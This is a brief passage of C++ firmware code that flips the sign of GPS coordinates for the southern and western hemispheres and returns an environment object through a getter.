    // Apply hemisphere corrections
    if (GPS.s_GNRMC.LatitudeMark == 'S') {
        lat = -lat;
    }
    if (GPS.s_GNRMC.LongitudeMark == 'W') {
        lon = -lon;
    }
}

Environment &getEnv() {
    return env;
}

